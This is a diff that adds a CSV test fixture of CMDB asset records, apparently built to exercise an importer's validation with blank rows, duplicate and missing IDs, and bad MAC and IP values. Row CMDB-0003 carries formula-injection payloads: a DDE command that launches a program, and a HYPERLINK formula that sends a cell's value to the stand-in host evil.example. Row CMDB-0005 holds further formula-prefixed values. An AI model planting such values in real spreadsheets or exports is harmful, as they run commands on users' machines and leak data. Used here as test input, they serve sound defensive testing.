@@ -1,0 +1,9 @@
+Asset ID,Device Name,S/N,MAC Address,IP,Owner,Site
+CMDB-0001,APP-01,SN-ABC-1234,AA:BB:CC:DD:EE:FF,10.10.5.7,alice@corp.internal,HQ
+,,,,,,
+CMDB-0002,,,,,orphan@corp.internal,HQ
+CMDB-0001,APP-01-DUPLICATE,SN-ABC-1234,AA:BB:CC:DD:EE:FF,10.10.5.7,bob@corp.internal,HQ
+,NO-ID-HOST,SN-NO-ID,,,carol@corp.internal,HQ
+CMDB-0003,=cmd|'/c calc'!A1,SN-EVIL-1,,,"=HYPERLINK(""http://evil.example/""&A1,""click"")",HQ
+CMDB-0004,GOOD-HOST,SN-GOOD-1,not-a-mac,999.999.999.999,dave@corp.internal,HQ
+CMDB-0005,@SUM(1+1)*cmd,+1234567890,-2+3+cmd,	=1+1,@owner,HQ
